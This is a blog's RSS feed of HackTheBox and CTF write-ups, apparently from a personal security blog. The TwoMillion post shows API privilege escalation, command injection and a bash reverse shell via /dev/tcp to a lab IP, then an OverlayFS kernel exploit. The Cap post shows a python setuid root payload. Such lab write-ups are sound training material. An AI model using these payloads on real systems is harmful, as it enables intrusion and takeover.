<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Chris Harris</title><link>https://cjharris.co.uk/posts/</link><description>Recent content in Posts on Chris Harris</description><generator>Hugo -- gohugo.io</generator><language>en-uk</language><lastBuildDate>Wed, 18 Feb 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://cjharris.co.uk/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>TwoMillion - HackTheBox Machine Writeup</title><link>https://cjharris.co.uk/posts/twomillion/</link><pubDate>Wed, 18 Feb 2026 00:00:00 +0000</pubDate><guid>https://cjharris.co.uk/posts/twomillion/</guid><description>Difficulty: Easy
Operating System: Linux
Recon and Enumeration We will start this machine by doing a quick nmap, this will give an idea of what is running so that I can begin to tackle it.
nmap 2million.htb
PORT STATE SERVICE 22/tcp open ssh 80/tcp open http After this, we can see 2 ports open:
An SSH server running on port 22. A web server running on port 80.</description><content type="html"><![CDATA[

<p><strong>Difficulty:</strong> Easy</p>

<p><strong>Operating System:</strong> Linux</p>

<h2 id="recon-and-enumeration">Recon and Enumeration</h2>

<p>We will start this machine by doing a quick <code>nmap</code>, this will give an idea of what is running so that I can begin to tackle it.</p>

<p><code>nmap 2million.htb</code></p>

<pre><code class="language-bash">PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre>

<p>After this, we can see 2 ports open:</p>

<ul>
<li>An SSH server running on port 22.</li>
<li>A web server running on port 80.</li>
</ul>

<h2 id="getting-the-foothold">Getting the Foothold</h2>

<p>Let&rsquo;s start by checking out the web server running on port 80:</p>

<p><img src="image-20260216203952694.png" alt="image-20260216203952694" /></p>

<p>We can see the site here, designed to be a throwback to the old UI.</p>

<p>Using this information, I go to <code>/invite</code> to request an invite code.</p>

<blockquote>
<p>&ldquo;Feel free to hack your way in :) &ldquo;</p>
</blockquote>

<p>If you look in the website source with developer tools, you can see the following:</p>

<p><img src="image-20260216205425752.png" alt="image-20260216205425752" /></p>

<p>For ease, please find it here:</p>

<pre><code class="language-javascript">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
</code></pre>

<p>So this is packed, I go to the following page to unpack it:
<a href="https://matthewfl.com/unPacker.html">https://matthewfl.com/unPacker.html</a></p>

<p><img src="image-20260216205803737.png" alt="image-20260216205803737" /></p>

<p>After this we have now discovered the <code>makeInviteCode()</code> function. Let&rsquo;s call this in our Javascript console and see what we get back:</p>

<p><img src="image-20260216210043414.png" alt="image-20260216210043414" /></p>

<p>This looks promising, but it needs further analysis, so I begin by expanding it:</p>

<p><img src="image-20260216210116027.png" alt="image-20260216210116027" /></p>

<p>We can see the data itself, as well as the <code>enctype</code>, which we are told is ROT13. I decide the easiest way to look at this is via <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.</p>

<p><img src="image-20260216210235831.png" alt="image-20260216210235831" /></p>

<p>Well, there is some instructions for us now. I will do exactly that:</p>

<pre><code class="language-bash">$curl -X POST http://2million.htb:80/api/v1/invite/generate
{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;RTBaUVotM0FSTEgtMzdDN0otU1JISlY=&quot;,&quot;format&quot;:&quot;encoded&quot;}}
</code></pre>

<p>Here I just send a POST request with curl, invoking the <code>-X</code> flag, this is just shorthand for `<code>--request</code>. Looking at what we get back, we have a code to use: <code>RTBaUVotM0FSTEgtMzdDN0otU1JISlY</code>, but as we can see from the data, it is encoded.</p>

<p>While I had a suspicion that it was base64 encoded from how it looked, we can use CyberChef&rsquo;s magic setting to uncover this:</p>

<p><img src="image-20260216210650189.png" alt="image-20260216210650189" /></p>

<p>And look at that, we have an invite code. Let&rsquo;s create a user:</p>

<p><img src="image-20260216210717286.png" alt="image-20260216210717286" /></p>

<p>And fill it with some dummy information for this use case:</p>

<p><img src="image-20260216210812129.png" alt="image-20260216210812129" /></p>

<p>We now have access to the platform itself:</p>

<p><img src="image-20260216210846917.png" alt="image-20260216210846917" /></p>

<p>After a bit of exploration, I found that if we scroll down on the left hand menu, we can find the lab access page.</p>

<p><img src="image-20260216210949006.png" alt="image-20260216210949006" /></p>

<p>I downloaded the connection file that we saw, just like for when you connect to any lab on the platform:</p>

<p><img src="image-20260216211343488.png" alt="image-20260216211343488" /></p>

<p>If you look at the following output, you can see that it doesn&rsquo;t work. I then decide to analyse this download request in Burp Suite and I can see that the download comes from: <code>/api/v1/user/vpn/generate</code>.</p>

<p>Rather than keep pressing download for every test, I can right click this and send it to the repeater.</p>

<p><img src="image-20260216213948654.png" alt="image-20260216213948654" /></p>

<p>I then tried a few things with the API, such as changing it from user to admin but got a 404, so I thought I would explore it further by just doing a GET to <code>/api</code> and seeing what we get back:</p>

<p><img src="image-20260216214359178.png" alt="image-20260216214359178" /></p>

<p>and if I just look at <code>/api/v1</code>, it gives me the following:</p>

<pre><code class="language-json">HTTP/1.1 200 OK

Server: nginx

Date: Mon, 16 Feb 2026 21:44:16 GMT

Content-Type: application/json

Connection: keep-alive

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Content-Length: 800



{&quot;v1&quot;:{&quot;user&quot;:{&quot;GET&quot;:{&quot;\/api\/v1&quot;:&quot;Route List&quot;,&quot;\/api\/v1\/invite\/how\/to\/generate&quot;:&quot;Instructions on invite code generation&quot;,&quot;\/api\/v1\/invite\/generate&quot;:&quot;Generate invite code&quot;,&quot;\/api\/v1\/invite\/verify&quot;:&quot;Verify invite code&quot;,&quot;\/api\/v1\/user\/auth&quot;:&quot;Check if user is authenticated&quot;,&quot;\/api\/v1\/user\/vpn\/generate&quot;:&quot;Generate a new VPN configuration&quot;,&quot;\/api\/v1\/user\/vpn\/regenerate&quot;:&quot;Regenerate VPN configuration&quot;,&quot;\/api\/v1\/user\/vpn\/download&quot;:&quot;Download OVPN file&quot;},&quot;POST&quot;:{&quot;\/api\/v1\/user\/register&quot;:&quot;Register a new user&quot;,&quot;\/api\/v1\/user\/login&quot;:&quot;Login with existing user&quot;}},&quot;admin&quot;:{&quot;GET&quot;:{&quot;\/api\/v1\/admin\/auth&quot;:&quot;Check if user is admin&quot;},&quot;POST&quot;:{&quot;\/api\/v1\/admin\/vpn\/generate&quot;:&quot;Generate VPN for specific user&quot;},&quot;PUT&quot;:{&quot;\/api\/v1\/admin\/settings\/update&quot;:&quot;Update user settings&quot;}}}}
</code></pre>

<p>I decide to prettify this with an online tool and I can see the following now:</p>

<pre><code class="language-json">&quot;admin&quot;: {
            &quot;GET&quot;: {
                &quot;\/api\/v1\/admin\/auth&quot;:&quot;Check if user is admin&quot;
            }, &quot;POST&quot;: {
                &quot;\/api\/v1\/admin\/vpn\/generate&quot;:&quot;Generate VPN for specific user&quot;
            }, &quot;PUT&quot;: {
                &quot;\/api\/v1\/admin\/settings\/update&quot;:&quot;Update user settings&quot;
            }

</code></pre>

<p>There are a few things going on here, but we see three available API calls that can be utilised.</p>

<p>I try the request to <code>/api/v1/admin/auth</code> and I get the following back:&rdquo;</p>

<p><img src="image-20260216214744048.png" alt="image-20260216214744048" /></p>

<p>So this has <code>message: false</code>, which must be telling us we are not the admin. So I then try the <code>/admin/settings/update</code> path to see what that returns:</p>

<p><img src="image-20260216214942983.png" alt="image-20260216214942983" /></p>

<p>Now while this is still unsuccessful, it returns a 200 status code, which means this was a successful web request. If we look at what it returns, it says that the message has an invalid content type:</p>

<pre><code class="language-json">&quot;message&quot;:&quot;Invalid content type.&quot;
</code></pre>

<p>The thought now is to actually provide a content type, so I add the following in to my web request:</p>

<pre><code class="language-json">Content-Type: application-json
</code></pre>

<p>Okay, now the error is a bit more informative:&rdquo;</p>

<pre><code class="language-json">{&quot;status&quot;:&quot;danger&quot;,&quot;message&quot;:&quot;Missing parameter: email&quot;}
</code></pre>

<p>We are told that there is a missing email parameter, so if I specify this to see what I get instead:</p>

<p><img src="image-20260216215706152.png" alt="image-20260216215706152" /></p>

<p>Now that we have the email provided, a different message is relayed, stating that <code>is_admin</code> is missing. I wasn&rsquo;t too sure what the format of this would be so I try sending a <code>1</code>:</p>

<p><img src="image-20260216215750523.png" alt="image-20260216215750523" /></p>

<p>And after running this, we should now have admin access for our user:</p>

<p><img src="image-20260216215842205.png" alt="image-20260216215842205" /></p>

<p>Now if we forward our original request to the repeater again and try our auth path from before, but rather tnan make any assumptions, we can test this with the <code>/api/v1/admin/auth</code> call from before:</p>

<p><img src="image-20260216220237373.png" alt="image-20260216220237373" /></p>

<p>Now that we are admin, we can try the final API call that we were provided with:</p>

<pre><code class="language-json">/api/v1/admin/vpn/generate
</code></pre>

<p>If we query this API, we now get back the following:</p>

<p><img src="image-20260216220416924.png" alt="image-20260216220416924" /></p>

<p>We now get the admin <code>.ovpn</code> file download, but I remembered from before that this wasn&rsquo;t the intended method, as running the file with <code>openvpn</code> did nothing. So I decide to analyse the web request that we got back:</p>

<p><img src="image-20260216220701163.png" alt="image-20260216220701163" /></p>

<p>These are bash commands that are being run, so there must be a way we can use this to run some commands to establish a foothold.</p>

<p>Using the format from before, as well as a <code>;</code> to run our command and a <code>#</code> to comment out anything after the command (i.e. the commands we saw in ther response):</p>

<p><img src="image-20260216220842649.png" alt="image-20260216220842649" /></p>

<p>This time, we get <code>www-data</code> returned, this must be the user we need to get access to. Now if we know we have basic bash commands for the user, we need to get a session on the system to dig around. For a reverse shell, I tend to default to the following cheat sheet:</p>

<p><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>

<p>Let&rsquo;s try sending the folllowing bash payload:</p>

<pre><code class="language-bash">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.57/54321 0&gt;&amp;1
</code></pre>

<p>and make sure to listen locally on our machine:</p>

<pre><code class="language-bash">nc -lnvp 54321
</code></pre>

<p>We can use <code>ip -c a</code> to get our VPN IP, remember we want the <code>tun0</code> IP as we are on the HackTheBox VPN. I send the request and if we go back ton the listening netcat session:</p>

<p><img src="image-20260216221358289.png" alt="image-20260216221358289" /></p>

<h2 id="getting-the-user-flag">Getting the User Flag</h2>

<p>We have a foothold, but <code>www-data</code> is a very low privelege user, so I need to find credentials for a different user. A simple <code>ls</code> shows the following files:</p>

<p><img src="image-20260216221801963.png" alt="image-20260216221801963" /></p>

<p>Credentials would tend to be stored in a <code>.env</code> file, while they may not be what we want, it is worth noting them down as password reuse could be occuring.</p>

<pre><code class="language-bash">DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
</code></pre>

<p>I decide it is worth trying them credentials anyway, so I try a <code>su</code> command for the admin user:</p>

<p><img src="image-20260216221914785.png" alt="image-20260216221914785" /></p>

<p>We have access, and we can now cat the <code>user.txt</code> file, providing us with the following hash: <code>e991f292403a56d3cf9ce50b00723803</code></p>

<h2 id="getting-the-root-flag">Getting the Root Flag</h2>

<p>The first thing I check on any privesc is what sudo capabilities I have with <code>sudo -l</code>, to which unfortunately we have none:</p>

<p><img src="image-20260218184507641.png" alt="image-20260218184507641" /></p>

<p>I then did quite a bit of exploration around common places where I have a chance of finding anything, remembering the email parameter from before as well as what I got for logging in to the <code>admin</code> user, I check <code>/var/mail</code> and I find the following mail:</p>

<pre><code class="language-email">admin@2million:/var/mail$ cat admin  
From: ch4p &lt;ch4p@2million.htb&gt;
To: admin &lt;admin@2million.htb&gt;
Cc: g0blin &lt;g0blin@2million.htb&gt;
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: &lt;9876543210@2million.htb&gt;
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
</code></pre>

<p>Immediately, it tells us about a vulnerability that we can exploit, so I search this online:</p>

<p><img src="image-20260216222632378.png" alt="image-20260216222632378" /></p>

<p>And this looks to be the following CVE: <a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/</a></p>

<p>We know that any kernel version lower than <code>6.2</code> is vulnerable, so I find that the version of the kernel being used here is: <code>5.15.70-051570-generic</code>, so it is vulnerable.</p>

<p>Given that this is a CVE, I explore GitLab for an exploit and come across the following repo:
<a href="https://github.com/puckiestyle/CVE-2023-0386">https://github.com/puckiestyle/CVE-2023-0386</a></p>

<p>I decide to download it as a <code>.zip</code>, as we know the target has no git connectivity to pull repos like this, I use the following <code>scp</code> command to get the file across to the target:</p>

<pre><code class="language-bash">scp CVE-2023-0386-main.zip admin@2million.htb:/tmp/
</code></pre>

<p>We now have it on the target system, so I can unzip the folder with <code>unzip</code>. When I complie it, it does have a few compiler warnings but it does compile successfully, I run the files as described in the <code>README.md</code> and I end up as <code>root</code>:</p>

<p><img src="image-20260218190552277.png" alt="image-20260218190552277" /></p>

<p>Now all there is left to do is <code>cat root/root.txt</code> and I get the following flag: <code>05ed20839b79996c7ba8ecca8f5cfcb1</code></p>
]]></content></item><item><title>Cap - HackTheBox Machine Writeup</title><link>https://cjharris.co.uk/posts/cap/</link><pubDate>Tue, 20 Jan 2026 00:00:00 +0000</pubDate><guid>https://cjharris.co.uk/posts/cap/</guid><description>Difficulty: Easy
Operating System: Linux
Recon and Enumeration We will start this machine by doing a quick nmap, this will give an idea of what is running so that I can begin to tackle it.
nmap cap.htb
PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http After this, we can see 3 ports open:
An FTP server running on port 21. An SSH server running on port 22.</description><content type="html"><![CDATA[

<p><strong>Difficulty:</strong> Easy</p>

<p><strong>Operating System:</strong> Linux</p>

<h2 id="recon-and-enumeration">Recon and Enumeration</h2>

<p>We will start this machine by doing a quick <code>nmap</code>, this will give an idea of what is running so that I can begin to tackle it.</p>

<p><code>nmap cap.htb</code></p>

<pre><code class="language-bash">PORT  STATE SERVICE 
21/tcp open  ftp 
22/tcp open  ssh 
80/tcp open  http
</code></pre>

<p>After this, we can see 3 ports open:</p>

<ul>
<li>An FTP server running on port 21.</li>
<li>An SSH server running on port 22.</li>
<li>A web server running on port 80.</li>
</ul>

<p>Let&rsquo;s start by checking out the web server. Upon doing so, we can see the following page.</p>

<p><img src="image-20260120180731056.png" alt="image-20260120180731056" /></p>

<p>The Security snapshot page looks interesting, after running for a few seconds, it gives the following:</p>

<p><img src="image-20260120181135324.png" alt="image-20260120181135324" /></p>

<p>Interestingly, inspecting the URL shows a <code>/data/1</code> , using this, we can see that there are clearly other packet captures stored, so I change this to a 0 to see what we get.</p>

<p>After changing it to 0, we can see a different pcap, with a lot more traffic, so I download this pcap to inspect in Wireshark.</p>

<p><img src="image-20260120181605535.png" alt="image-20260120181605535" /></p>

<p>So in the packet, knowing the ports running, I decided to apply an FTP filter and see if we get anything.</p>

<p><img src="image-20260120181813050.png" alt="image-20260120181813050" /></p>

<p>Not only can we see a lot of traffic, the screenshot shows a user: <code>nathan</code> and a password in plaintext: <code>Buck3tH4TF0RM3!</code>.</p>

<p>Now there was an SSH server running on port 22, so I am going to try them credentials and see if I can get access to the <code>nathan</code> user.</p>

<p><img src="image-20260120182127937.png" alt="image-20260120182127937" /></p>

<p>And as predicted, we now have a foothold on the system.</p>

<h2 id="user-own">User Own</h2>

<p>Now that we are on the system, let&rsquo;s look around for the user flag, which can be found with a simple <code>ls</code>:</p>

<pre><code>nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt
53b7aa6e6fb4a4f7355806f9dab7003f
</code></pre>

<p><img src="image-20260120182215595.png" alt="image-20260120182215595" /></p>

<h2 id="root-own">Root Own</h2>

<p>After trying a few other tricks, I try <code>getcap</code>, a command in Linux that can be used to display file capabilities and list specific privileges assigned to executables. To further break down the command:</p>

<ul>
<li><code>-r</code> - recursive.</li>
<li><code>/</code> - Start from the root directory</li>
<li><code>2&gt;/dev/null</code> - This redirects our output, using the <code>2</code> will represent <code>stderr</code> and it is redirecting them to <code>/dev/null</code>. This means we will essentially get rid of all of the files that this command errors on, revealing the ones we have capabilities to run.</li>
</ul>

<p><img src="image-20260120182840258.png" alt="image-20260120182840258" /></p>

<p>Looking at our output, the one that stands out is <code>/usr/bin/python3.8</code>, we can run this with <code>cap_setuid</code>, meaning we can set our user to root. I then call the python3.8 binary with a simple python paylod:</p>

<p><code>/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'</code></p>

<p>Breaking down this command:</p>

<ul>
<li><code>/usr/bin/python3.8</code> - we have privileges to run set our uid with this.</li>
<li><code>-c</code> - command, this runs directly in the terminal, as opposed to saving it in a file and running it.</li>
<li><code>import os</code> - import the os module in Python.</li>
<li><code>os.setuid(0)</code> - set our uid to 0, the uid of the root user.</li>
<li><code>os.system(&quot;/bin/bash&quot;)</code> - this will execute a bash shell for us.</li>
</ul>

<p>If I now run a <code>whoami</code>, I can see that command worked as expected and gave us access to the root user.</p>

<p><img src="image-20260120183401119.png" alt="image-20260120183401119" /></p>

<p>Now that we are the root user, we can grab the root flag and this box is now complete.</p>

<p><img src="image-20260120183540383.png" alt="image-20260120183540383" /></p>

<pre><code class="language-bash">root@cap:~$ ls /root/root.txt
root.txt
root@cap:~$ cat /root/root.txt
1973e3470a98a52f8d52de5c878cee1f
</code></pre>
]]></content></item><item><title>Advent of Code 2025 Solutions</title><link>https://cjharris.co.uk/posts/advent-of-code-2025/</link><pubDate>Mon, 01 Dec 2025 00:00:00 +0000</pubDate><guid>https://cjharris.co.uk/posts/advent-of-code-2025/</guid><description>For the 2025 Advent of Code challenges, I have published my developed solutions at the above GitHub repo.
All solutions are developed in Golang as I used this event as an opportunity to learn and strengthen my Go skills.</description><content type="html"><![CDATA[<p><a href="https://github.com/cjharris18/advent-of-code-2025"><img src="https://github-readme-stats-fast.vercel.app/api/pin/?username=cjharris18&amp;repo=advent-of-code-2025&amp;theme=dark" alt="Readme Card" /></a></p>

<p>For the <a href="https://adventofcode.com/2025">2025 Advent of Code</a> challenges, I have published my developed solutions at the above GitHub repo.</p>

<p>All solutions are developed in Golang as I used this event as an opportunity to learn and strengthen my Go skills.</p>
]]></content></item><item><title>Advent of Code 2024 Solutions</title><link>https://cjharris.co.uk/posts/advent-of-code-2024/</link><pubDate>Sun, 01 Dec 2024 00:00:00 +0000</pubDate><guid>https://cjharris.co.uk/posts/advent-of-code-2024/</guid><description>My published solutions for the 2024 Advent of Code challenges.
All solutions are developed in Python3. The solutions created are the optimised solutions, I am planning on expanding on these with writeups soon.</description><content type="html"><![CDATA[<p><a href="https://github.com/cjharris18/advent-of-code-2024"><img src="https://github-readme-stats-fast.vercel.app/api/pin/?username=cjharris18&amp;repo=advent-of-code-2024&amp;theme=dark" alt="Readme Card" /></a></p>

<p>My published solutions for the <a href="https://adventofcode.com/2024">2024 Advent of Code</a> challenges.</p>

<p>All solutions are developed in Python3. The solutions created are the optimised solutions, I am planning on expanding on these with writeups soon.</p>
]]></content></item><item><title>IntakeCTF - Missing Bytes Writeup</title><link>https://cjharris.co.uk/posts/intakectfmissingbytes/</link><pubDate>Tue, 26 Oct 2021 00:00:00 +0000</pubDate><guid>https://cjharris.co.uk/posts/intakectfmissingbytes/</guid><description>Here is my writeup for the Missing Bytes challenge from the IntakeCTF, hosted by the WMG Cyber Society. An internal CTF hosted at the University of Warwick for the Cyber Security students. I also posted this on their website.
We are told that the PNG image provided won&amp;rsquo;t open.
The first thing we can try is to use the pngcheck command, this will tell us if the PNG is corrupted, and if so hopefully how exactly it is corrupted.</description><content type="html"><![CDATA[<p>Here is my writeup for the <strong>Missing Bytes</strong> challenge from the IntakeCTF, hosted by the WMG Cyber Society. An internal CTF hosted at the University of Warwick for the Cyber Security students. I also posted this on <a href="https://society.cyber.warwick.ac.uk/intakectfmissingbytes/">their website</a>.</p>

<p>We are told that the PNG image provided won&rsquo;t open.</p>

<p><img src="image_1.png" alt="Figure 1" /></p>

<p>The first thing we can try is to use the <a href="https://manpages.debian.org/stretch/pngcheck/pngcheck.1.en.html"><code>pngcheck</code></a> command, this will tell us if the PNG is corrupted, and if so hopefully how exactly it is corrupted.</p>

<pre><code>$ pngcheck -v IntakeCTF_flag.png 
File: IntakeCTF_flag.png (84279 bytes)
  chunk IHDR at offset 0x0000c, length 13:  invalid image dimensions (0x0)
ERRORS DETECTED in IntakeCTF_flag.png
</code></pre>

<p>We are given some quite helpful output here. Firstly, we are told that there is an issue in the <a href="https://www.w3.org/TR/PNG-Chunks.html">IHDR</a> chunk. This must be found in every PNG image. This is where our second piece of information comes in useful. We are told there is an issue with the image dimensions being invalid. So, we now know why the image is corrupted and as a result, won&rsquo;t open.</p>

<p>To further reiterate this, let&rsquo;s take a look at a hexdump of the file. We can do this by using <code>xxd</code>, and since what we desire is from the IHDR chunk, which is at the beginning of the file, we can pipe this into <code>head</code> so that we have less information to deal with.</p>

<pre><code>$ xxd IntakeCTF_flag.png | head
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0000 0000 0000 0806 0000 00c6 15b7  ................
00000020: e200 0148 fe49 4441 5478 01ec c109 80d5  ...H.IDATx......
00000030: 75bd ffff e7eb f3fd 9e65 1686 611b 4676  u........e..a.Fv
00000040: d904 2444 4473 bb46 6a69 655a 6a66 6e2d  ..$DDs.FjieZjfn-
00000050: 66dd 32b3 cdb4 faab 376d b9e5 357f e552  f.2.....7m..5..R
00000060: 5656 9ad7 3ddb 4dbd 6648 2a2e 8888 c832  VV..=.M.fH*....2
00000070: b209 386c c330 cc9c 3973 96ef f7f3 fe9f  ..8l.0..9s......
00000080: 5958 3430 4034 d3f3 7850 5656 5656 5656  YX40@4..xPVVVVVV
00000090: 5656 5656 5656 5656 5656 5656 5656 5656  VVVVVVVVVVVVVVVV
</code></pre>

<p>Now, lets break this down as much as possible so we can fully understand what we are seeing.</p>

<ul>
<li><code>89 50 4e 47 0d 0a 1a 0a</code>: Firstly, this can be identified as the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature</a>, this is what UNIX systems use to identify a filetype.</li>
<li><code>00 00 00 0d</code>: This is our IHDR length.</li>
<li><code>49 48 44 52</code>: This is our chunk type, which in this case specifies IHDR.</li>
<li><code>00 00 00 00</code>: This is our <strong>width</strong>, remember this was invalid before.</li>
<li><code>00 00 00 00</code>: This is our <strong>height</strong>, this was also invalid before.</li>
<li><code>08</code>: This is our bit depth.</li>
<li><code>06</code>: This is our colour type.</li>
<li><code>00</code>: This is our compression type.</li>
<li><code>00</code>: This is our filter type.</li>
<li><code>00</code>: This is our interval type.</li>
<li><code>c6 15 b7 e2</code>: This is our <strong>crc checksum</strong>. This will be important later.</li>
</ul>

<p>For those curious how I know what each exact byte is, that is because with a PNG, these items of the IHDR chunk will always be found at the same place. This is useful to know for later on when we begin to fix the image dimensions. For more information on this, I find <a href="https://stackoverflow.com/questions/54845745/not-able-to-read-ihdr-chunk-of-a-png-file">this StackOverflow article</a> explains it well.</p>

<p>Now, we know that the image dimensions are invalid, and where they are in the hexdump. So we can bruteforce every possible combination of dimensions to work out which the correct dimensions are. The only question now before we begin scripting is the following: <em>How will I know when the image dimensions are correct?</em></p>

<p>There are technically 2 answers to this one:
1. We can try every combination manually and see if the file opens, if it does then the dimensions are correct.
2. We can use something I have previously mentioned, the <strong>crc checksum</strong>.</p>

<p>Now, given the amount of possible combinations of image dimensions, it is best to choose the second option.</p>

<p>So, lets start by explaining what the crc checksum itself is. Essentially, it is calculated based on the chunk data. If the IHDR chunk is valid, then it&rsquo;s <a href="http://www.dalkescientific.com/writings/diary/archive/2014/07/10/png_checksum.html">crc checksum</a> will match the crc provided in the hexdump. We can use this information to set a &lsquo;target&rsquo; in our script.</p>

<p>For the purpose of this challenge, I decided the smartest language to script in was <code>Python3</code>.</p>

<pre><code class="language-python">#!/usr/bin/env python3

from zlib import crc32

</code></pre>

<p>Firstly, we are importing the <code>zlib.crc32</code> method, this is what we can use to compute the checksum for the new IHDR chunk.</p>

<pre><code class="language-python">data = open(&quot;IntakeCTF_flag.png&quot;,'rb').read()
index = 12

ihdr = bytearray(data[index:index+17]) #ihdr
width_index = 7 #width
height_index = 11 #height
</code></pre>

<p>Then, we open the file in read mode. We then set our index as 12, this is because of the positioning of the start of the IHDR chunk. We then read the IHDR chunk itself as a byte array to the <code>ihdr</code> variable. Note the <code>17</code> used due to the length of the IHDR chunk. We then also set index values for the width and height, based on their position in the IHDR chunk.</p>

<pre><code class="language-python">for x in range (1,2000):
    height = bytearray(x.to_bytes(2,'big'))
    for y in range(1,2000):
        width = bytearray(y.to_bytes(2,'big'))
        for h in range(len(height)):
            ihdr[height_index - h] = height[-h -1]
        for w in range(len(width)):
            ihdr[width_index - w] = width[-w -1]
        if hex(crc32(ihdr)) == '0xc615b7e2': #crc
            print(&quot;width: {} height: {}&quot;.format(width.hex(),height.hex()))
        for i in range(len(width)):
            ihdr[width_index - i] = bytearray(b'\x00')[0]
</code></pre>

<p>I then nested some for loops, these look way more confusing than they are. We essentially, just keep searching until we find that the calculated crc checksum of the IHDR checksum, matches our target checksum. If this is the case, it prints the dimensions that meet this criteria. For when we define width and height, note the <strong>big</strong> when we call the <code>.to_bytes()</code> method. This simply refers to the face we want it to be packed as big endian.</p>

<p>All together, my script looks like this:</p>

<pre><code class="language-python">#!/usr/bin/env python3

from zlib import crc32

data = open(&quot;IntakeCTF_flag.png&quot;,'rb').read()
index = 12

ihdr = bytearray(data[index:index+17]) #ihdr
width_index = 7 #width
height_index = 11 #height

for x in range (1,2000):
    height = bytearray(x.to_bytes(2,'big'))
    for y in range(1,2000):
        width = bytearray(y.to_bytes(2,'big'))
        for h in range(len(height)):
            ihdr[height_index - h] = height[-h -1]
        for w in range(len(width)):
            ihdr[width_index - w] = width[-w -1]
        if hex(crc32(ihdr)) == '0xc615b7e2': #crc
            print(&quot;width: {} height: {}&quot;.format(width.hex(),height.hex()))
        for i in range(len(width)):
            ihdr[width_index - i] = bytearray(b'\x00')[0]
</code></pre>

<p>What this then spits out is as follows:</p>

<pre><code>$ ./png_image_bruteforcer.py
Width: 0190
Height: 00c8
</code></pre>

<p>From this, we now have the correct image dimensions, so we simply use a hex editor (I reccomend <a href="https://wiki.gnome.org/Apps/Ghex">ghex</a> or <a href="https://hexed.it/">hexed.it</a> for an online alternative) to put these where the old bytes were, like so:</p>

<p><img src="image_2.png" alt="Figure 2" /></p>

<p>Notice how we have to pad the <code>01 90</code> and <code>00 c8</code> with <code>00</code> bytes. This is because the width and height are each 4 bytes. So to get the right dimensions, we pad these both with 2 <code>00</code> bytes at the front, as shown in the image.</p>

<p>And finally, the image now opens:</p>

<p><img src="image_3.png" alt="Figure 3" /></p>

<p>We see that the flag is <code>WMG{BruT3_F0rc3_Fun}</code> and the challenge is solved.</p>

<p>It is worth noting that my script is far from perfect, it was really just a quick CTF solve script. To help this, I have put my script on GitHub and made gradual improvements over time. It is now far more usable, and far more efficient and powerful. It can be found <a href="https://github.com/cjharris18/png-dimensions-bruteforcer">here</a>.</p>
]]></content></item><item><title>Templated - HackTheBox Web Challenge Writeup</title><link>https://cjharris.co.uk/posts/templated/</link><pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate><guid>https://cjharris.co.uk/posts/templated/</guid><description>This writeup covers the steps taken to complete the Templated challenge in the Web category on HackTheBox. The challenge involved exploiting a Template Injection vulnerability to achieve Remote Code Execution (RCE) and ultimately retrieve the flag.
Upon starting the challenge, we are provided with the following:
Testing for Template Injection The first thing that stood out was the potential for a Jinja2 Template Injection vulnerability, which is common in web applications that render user input using Jinja2 templates.</description><content type="html"><![CDATA[

<p>This writeup covers the steps taken to complete the Templated challenge in the Web category on HackTheBox. The challenge involved exploiting a <strong>Template Injection vulnerability</strong> to achieve <strong>Remote Code Execution (RCE)</strong> and ultimately retrieve the flag.</p>

<p>Upon starting the challenge, we are provided with the following:</p>

<p><img src="image.png" alt="Screenshot from the site." /></p>

<h2 id="testing-for-template-injection">Testing for Template Injection</h2>

<p>The first thing that stood out was the potential for a Jinja2 Template Injection vulnerability, which is common in web applications that render user input using Jinja2 templates.</p>

<p>To test for a possible template injection, I started experimenting with basic Jinja2 syntax. One simple test payload was <code>{{7*7}}</code>, which is a common payload to check if template injection is possible. This payload should return <strong>49</strong> (the result of the multiplication) or instead <strong>7777777</strong> (seven 7&rsquo;s).</p>

<p>However, when I submitted it, the result was <strong>7777777</strong>, which indicates that template injection was indeed possible and that the application was evaluating Jinja2 expressions.</p>

<h2 id="what-is-template-injection">What is Template Injection?</h2>

<p>Jinja2 is a popular templating engine used in Python-based web frameworks like Flask and Django. It allows for dynamic content generation by embedding variables and logic in HTML templates.</p>

